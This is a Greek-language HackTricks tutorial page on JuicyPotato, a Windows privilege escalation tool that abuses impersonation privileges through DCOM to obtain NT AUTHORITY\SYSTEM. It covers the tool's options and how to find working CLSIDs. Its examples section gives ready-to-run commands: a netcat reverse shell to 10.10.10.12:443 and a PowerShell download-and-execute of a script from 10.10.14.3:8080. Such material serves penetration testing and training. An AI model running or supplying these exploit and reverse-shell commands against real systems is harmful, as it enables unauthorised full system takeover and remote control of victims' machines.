# JuicyPotato

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks**; ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε τη [**Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε** στη [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**αποθετήρια hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) είναι μια μηχανή αναζήτησης που τροφοδοτείται από το **dark web** και προσφέρει **δωρεάν** λειτουργίες για να ελέγξετε αν μια εταιρεία ή οι πελάτες της έχουν **διαρρεύσει** από **κλέφτες κακόβουλου λογισμικού**.

Ο κύριος στόχος του WhiteIntel είναι η καταπολέμηση των αναλήψεων λογαριασμών και των επιθέσεων ransomware που προκύπτουν από κακόβουλο λογισμικό που κλέβει πληροφορίες.

Μπορείτε να ελέγξετε τον ιστότοπό τους και να δοκιμάσετε τη μηχανή τους δωρεάν στο:

{% embed url="https://whiteintel.io" %}

---

{% hint style="warning" %}
**Το JuicyPotato δεν λειτουργεί** στα Windows Server 2019 και στα Windows 10 έκδοση 1809 και μετά. Ωστόσο, τα [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) μπορούν να χρησιμοποιηθούν για να **εκμεταλλευτούν τα ίδια προνόμια και να κερδίσουν πρόσβαση σε επίπεδο `NT AUTHORITY\SYSTEM`**. _**Ελέγξτε:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (κατάχρηση των χρυσών προνομίων) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_Μια γλυκιά εκδοχή του_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, με λίγο χυμό, δηλαδή **ένα εργαλείο Ανόδου Προνομίων Τοπικού Συστήματος, από Λογαριασμούς Υπηρεσίας Windows σε NT AUTHORITY\SYSTEM**_

#### Μπορείτε να κατεβάσετε το juicypotato από [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Σύνοψη <a href="#summary" id="summary"></a>

[**Από το Readme του juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

Το [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) και οι [παραλλαγές του](https://github.com/decoder-it/lonelypotato) εκμεταλλεύονται την αλυσίδα ανόδου προνομίων βασισμένη στην υπηρεσία [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) με τον ακροατή MiTM στο `127.0.0.1:6666` και όταν έχετε προνόμια `SeImpersonate` ή `SeAssignPrimaryToken`. Κατά την αναθεώρηση ενός Windows build, βρήκαμε μια ρύθμιση όπου το `BITS` ήταν εσκεμμένα απενεργοποιημένο και η θύρα `6666` ήταν κατειλημμένη.

Αποφασίσαμε να όπλισουμε το [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Πείτε γεια στο Juicy Potato**.

> Για τη θεωρία, δείτε το [Rotten Potato - Ανόδος Προνομίων από Λογαριασμούς Υπηρεσίας σε SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) και ακολουθήστε τη σειρά των συνδέσμων και αναφορών.

Ανακαλύψαμε ότι, εκτός από το `BITS`, υπάρχουν αρκετοί COM servers που μπορούμε να καταχρηστικοποιήσουμε. Απλώς πρέπει:

1. να είναι δυνατή η δημιουργία από τον τρέχοντα χρήστη, συνήθως ένας "χρήστης υπηρεσίας" που έχει προνόμια υποκατάστασης
2. να υλοποιούν τη διεπαφή `IMarshal`
3. να τρέχουν ως χρήστης με υψηλά προνόμια (SYSTEM, Διαχειριστής, ...)

Μετά από μερικές δοκιμές, αποκτήσαμε και δοκιμάσαμε μια εκτεταμένη λίστα [ενδιαφέροντων CLSID's](http://ohpe.it/juicy-potato/CLSID/) σε διάφορες εκδόσεις των Windows.

### Λεπτομέρειες Juicy <a href="#juicy-details" id="juicy-details"></a>

Το JuicyPotato σάς επιτρέπει να:

* **Στόχος CLSID** _επιλέξτε οποιοδήποτε CLSID θέλετε._ [_Εδώ_](http://ohpe.it/juicy-potato/CLSID/) _μπορείτε να βρείτε τη λίστα οργανωμένη ανά λειτουργικό σύστημα._
* **Πόρτα COM ακρόασης** _ορίστε την πόρτα COM ακρόασης που προτιμάτε (αντί για το marshalled hardcoded 6666)_
* **Διεύθυνση IP ακρόασης COM** _δέστε τον εξυπηρετητή σε οποιαδήποτε IP_
* **Λειτουργία δημιουργίας διεργασίας** _ανάλογα με τα προνόμια υποκατάστασης του χρήστη, μπορείτε να επιλέξετε από:_
* `CreateProcessWithToken` (χρειάζεται `SeImpersonate`)
* `CreateProcessAsUser` (χρειάζεται `SeAssignPrimaryToken`)
* `και τα δύο`
* **Διεργασία για εκκίνηση** _εκκινήστε ένα εκτελέσιμο ή σενάριο αν η εκμετάλλευση επιτύχει_
* **Παράμετρος διεργασίας** _προσαρμόστε τις παραμέτρους της εκκινούμενης διεργασίας_
* **Διεύθυνση RPC Server** _για μια αθόρυβη προσέγγιση μπορείτε να πιστοποιηθείτε σε έναν εξωτερικό διακομιστή RPC_
* **Πόρτα RPC Server** _χρήσιμο αν θέλετε να πιστοποιηθείτε σε έναν εξωτερικό διακομιστή και το τείχος πυρασφάλειας αποκλείει τη θύρα `135`..._
* **Λειτουργία ΔΟΚΙΜΗΣ** _κυρίως για δοκιμαστικούς σκοπούς, δηλαδή δοκιμή CLSIDs. Δημιουργεί το DCOM και εκτυπώνει τον χρήστη του τοκέν. Δείτε_ [_εδώ για δοκιμή_](http://ohpe.it/juicy-potato/Test/)
### Χρήση <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Τελικές σκέψεις <a href="#final-thoughts" id="final-thoughts"></a>

[**Από το Readme του juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Αν ο χρήστης έχει προνόμια `SeImpersonate` ή `SeAssignPrimaryToken` τότε είστε **SYSTEM**.

Είναι σχεδόν αδύνατο να αποτρέψετε την κατάχρηση όλων αυτών των COM Servers. Μπορείτε να σκεφτείτε να τροποποιήσετε τα δικαιώματα αυτών των αντικειμένων μέσω του `DCOMCNFG` αλλά καλή τύχη, αυτό θα είναι πρόκληση.

Η πραγματική λύση είναι να προστατεύσετε ευαίσθητους λογαριασμούς και εφαρμογές που εκτελούνται υπό τους λογαριασμούς `* SERVICE`. Η διακοπή του `DCOM` θα εμπόδιζε σίγουρα αυτήν την εκμετάλλευση αλλά θα μπορούσε να έχει σοβαρές επιπτώσεις στο υποκείμενο λειτουργικό σύστημα.

Από: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## Παραδείγματα

Σημείωση: Επισκεφθείτε [αυτήν τη σελίδα](https://ohpe.it/juicy-potato/CLSID/) για μια λίστα με CLSIDs προς δοκιμή.

### Λήψη αντίστροφου κελύφους nc.exe
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell αναστροφή
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Εκκίνηση νέου CMD (εάν έχετε πρόσβαση RDP)

![](<../../.gitbook/assets/image (297).png>)

## Προβλήματα CLSID

Συχνά, το προεπιλεγμένο CLSID που χρησιμοποιεί το JuicyPotato **δεν λειτουργεί** και η εκμετάλλευση αποτυγχάνει. Συνήθως, απαιτούνται πολλαπλές προσπάθειες για να βρείτε ένα **εργάσιμο CLSID**. Για να λάβετε μια λίστα με τα CLSID που πρέπει να δοκιμάσετε για ένα συγκεκριμένο λειτουργικό σύστημα, πρέπει να επισκεφθείτε αυτήν τη σελίδα:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **Έλεγχος CLSIDs**

Αρχικά, θα χρειαστείτε μερικά εκτελέσιμα εκτός από το juicypotato.exe.

Κατεβάστε το [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) και φορτώστε το στη συνεδρία PS σας, κατεβάστε και εκτελέστε το [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Αυτό το σενάριο θα δημιουργήσει μια λίστα πιθανών CLSIDs για δοκιμή.

Στη συνέχεια, κατεβάστε το [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(αλλάξτε τη διαδρομή προς τη λίστα CLSID και προς το εκτελέσιμο juicypotato) και εκτελέστε το. Θα αρχίσει να δοκιμάζει κάθε CLSID, και **όταν ο αριθμός θύρας αλλάξει, θα σημαίνει ότι το CLSID λειτούργησε**.

**Ελέγξτε** τα εργάσιμα CLSIDs **χρησιμοποιώντας την παράμετρο -c**

## Αναφορές

* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="/.gitbook/assets/image (1224).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) είναι μια μηχανή αναζήτησης που τροφοδοτείται από το **dark web** και προσφέρει **δωρεάν** λειτουργίες για να ελέγξετε εάν μια εταιρεία ή οι πελάτες της έχουν **διαρρεύσει** από **κλέφτες κακόβουλου λογισμικού**.

Ο κύριος στόχος του WhiteIntel είναι η καταπολέμηση των αποκλεισμών λογαριασμών και των επιθέσεων ransomware που προκύπτουν από κακόβουλο λογισμικό που κλέβει πληροφορίες.

Μπορείτε να ελέγξετε την ιστοσελίδα τους και να δοκιμάσετε τη μηχανή τους δωρεάν στο:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Εργάζεστε σε μια **εταιρεία κυβερνοασφάλειας**; Θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks**; ή θέλετε να έχετε πρόσβαση στην **τελευταία έκδοση του PEASS ή να κατεβάσετε το HackTricks σε μορφή PDF**; Ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Εγγραφείτε στη** [**💬**](https://emojipedia.org/speech-balloon/) [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** με στο **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στο** [**αποθετήριο hacktricks**](https://github.com/carlospolop/hacktricks) **και** [**αποθετήριο hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
